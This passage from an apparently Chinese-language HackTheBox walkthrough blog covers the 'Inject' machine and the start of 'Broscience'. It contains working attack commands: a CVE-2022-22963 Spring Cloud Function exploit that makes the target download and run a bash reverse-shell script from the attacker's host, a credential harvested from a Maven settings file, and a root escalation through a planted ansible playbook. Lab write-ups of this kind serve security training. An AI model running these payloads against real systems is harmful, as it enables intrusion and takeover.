class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>WebApp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>WebApp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java.version</span>&gt;</span>11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.activation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.activation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-function-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bootstrap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>webjars-locator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;parent.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">finalName</span>&gt;</span>spring-webapp<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>spring-cloud-function-web 3.2.2存在RCE漏洞</p><blockquote><p><a href="https://www.zscaler.com/blogs/security-research/analysis-spring-cloud-framework-vulnerabilities">https://www.zscaler.com/blogs/security-research/analysis-spring-cloud-framework-vulnerabilities</a><br /><a href="https://github.com/dinosn/CVE-2022-22963/blob/main/poc.py">https://github.com/dinosn/CVE-2022-22963/blob/main/poc.py</a></p></blockquote><p>构造EXP并触发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.*.*/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL</span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line">python -m http.server 80&amp;</span><br><span class="line">proxychains curl http://10.10.11.204:8080/functionRouter -H <span class="string">&#x27;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;curl http://10.10.*.*/BFL -o /tmp/BFL&quot;)&#x27;</span> -d <span class="string">&quot;BFL&quot;</span></span><br><span class="line">proxychains curl http://10.10.11.204:8080/functionRouter -H <span class="string">&#x27;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/BFL&quot;)&#x27;</span> -d <span class="string">&quot;BFL&quot;</span></span><br></pre></td></tr></table></figure><p>获得反弹Shell</p><p>得到<code>phil</code>账号信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/frank/.m2/settings.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>Inject<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">username</span>&gt;</span>phil<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">password</span>&gt;</span>DocPhillovestoInject123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">privateKey</span>&gt;</span>$&#123;user.home&#125;/.ssh/id_dsa<span class="tag">&lt;/<span class="name">privateKey</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filePermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">filePermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directoryPermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">directoryPermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><p>切换账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su phil</span><br><span class="line">DocPhillovestoInject123</span><br></pre></td></tr></table></figure><p>获取tty</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/phil/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21440ad399cf843bcf64f2f7fa9ff600</span><br></pre></td></tr></table></figure><h2 id="权限提升-27"><a class="markdownIt-Anchor" href="#权限提升-27"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;1001(phil) gid&#x3D;1001(phil) groups&#x3D;1001(phil),50(staff)</span><br></pre></td></tr></table></figure><p>staff组权限</p><p>查看staff组权限相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group staff -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">183353      4 drwxrwxr-x   2 root     staff        4096 Mar 20 16:02 &#x2F;opt&#x2F;automation&#x2F;tasks</span><br></pre></td></tr></table></figure><p>下载pspy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>获取pspy并运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.16.8/pspy64 -o /tmp/pspy64</span><br><span class="line">chmod +x /tmp/pspy64</span><br><span class="line">/tmp/pspy64</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3720   | sleep 10 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3718   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ansible-parallel &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3717   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ansible-parallel &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;*.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3716   | &#x2F;bin&#x2F;sh -c sleep 10 &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;rm -rf &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;* &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;cp &#x2F;root&#x2F;playbook_1.yml &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3715   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3714   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3722   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3732   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3728   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3733   | &#x2F;lib&#x2F;systemd&#x2F;systemd-udevd </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3748   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3747   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py &amp;&amp; sleep 0 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3746   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py &amp;&amp; sleep 0&#39; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3751   | &#x2F;usr&#x2F;bin&#x2F;python3 -Es &#x2F;usr&#x2F;bin&#x2F;lsb_release -a </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3755   | &#x2F;usr&#x2F;bin&#x2F;python3 -Es &#x2F;usr&#x2F;bin&#x2F;lsb_release -a </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3759   | &#x2F;usr&#x2F;bin&#x2F;lspci -D </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3771   | &#x2F;sbin&#x2F;vgs --noheadings --nosuffix --units g --separator , </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3773   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3799   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3818   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3817   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py &amp;&amp; sleep 0 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3816   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py &amp;&amp; sleep 0&#39; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:05 CMD: UID&#x3D;0     PID&#x3D;3820   | &#x2F;usr&#x2F;bin&#x2F;systemctl show webapp</span><br></pre></td></tr></table></figure><p>这里只能ctrl+c退掉shell然后再弄个shell</p><blockquote><p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/</a></p></blockquote><p>构造BFL.yml如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">RShell</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">bash</span> <span class="string">/tmp/BFL_root</span></span><br></pre></td></tr></table></figure><p>写入至<code>/opt/automation/tasks/BFL.yml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;LSBob3N0czogbG9jYWxob3N0CiAgdGFza3M6CiAgICAtIG5hbWU6IFJTaGVsbAogICAgICBjb21tYW5kOiBiYXNoIC90bXAvQkZMX3Jvb3Q=&quot;</span> | base64 -d &gt; /opt/automation/tasks/BFL.yml</span><br></pre></td></tr></table></figure><p>构造触发目标反弹Shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.*.*/9997 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL_root</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>获取bash脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.*.*/BFL_root -o /tmp/BFL_root</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>计划任务<code>/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</code>触发<code>/opt/automation/tasks/BFL.yml</code>再触发<code>/tmp/BFL_root</code>实现反弹Shell</p><p>查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b326b1361a10a45872887e9aaf6352b</span><br></pre></td></tr></table></figure><hr /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh phil@10.10.11.204</span><br><span class="line">phil@10.10.11.204<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">DenyUsers phil</span><br></pre></td></tr></table></figure><p>嗯</p><hr /><h1 id="hackthebox_broscience"><a class="markdownIt-Anchor" href="#hackthebox_broscience"></a> HackTheBox_Broscience</h1><h2 id="信息收集-12"><a class="markdownIt-Anchor" href="#信息收集-12"></a> 信息收集</h2><h3 id="端口扫描-29"><a class="markdownIt-Anchor" href="#端口扫描-29"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.195</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.195</span><br><span class="line">Host is up (0.60s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORTSTATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh  OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp  open  http Apache httpd 2.4.54</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.54 ((Debian))</span><br><span class="line">Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举-8"><a class="markdownIt-Anchor" href="#路径枚举-8"></a> 路径枚举</h3><p>查看域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.195</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Thu, 23 Mar 2023 11:11:56 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.54 (Debian)</span><br><span class="line">Location: https:&#x2F;&#x2F;broscience.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.195\tbroscience.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;images&#x2F;   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;includes&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;manual&#x2F;</span><br></pre></td></tr></table></figure><p>枚举PHP文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/ -X .php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td 